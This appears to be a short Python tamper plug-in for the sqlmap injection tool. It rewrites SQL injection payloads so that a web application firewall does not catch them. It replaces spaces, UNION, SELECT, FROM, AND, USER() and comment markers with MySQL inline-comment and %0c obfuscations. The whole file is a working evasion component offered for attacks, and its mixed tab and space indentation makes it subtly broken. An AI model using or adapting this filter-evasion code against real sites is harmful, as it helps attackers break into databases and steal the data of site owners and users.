#!/usr/bin/env python

"""
By :NIU B
"""
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
def dependencies():
    pass
def tamper(payload, **kwargs):

    if payload:
		payload=payload.replace(" ","/*!*/")
		payload=payload.replace("=","/*!=/*/*!-*/%0c*/")
		payload=payload.replace("AND","/*!AND/*/*!-*/%0c*/")
		payload=payload.replace("UNION","union/*!/*/*!-*/%0c*/")
		payload=payload.replace("#","/*!*/#")
		payload=payload.replace("USER()","USER/*!()/*/*!-*/%0c*/")
		payload=payload.replace("DATABASE()","DATABASE/*!()*/")
		payload=payload.replace("--","/*!*/--")
		payload=payload.replace("SELECT","/*!/*/*!-*/%0c*/select")
		payload=payload.replace("FROM","/*!/*/*!++/**/*//*!/*/*!++/**/c*/from")


    return payload
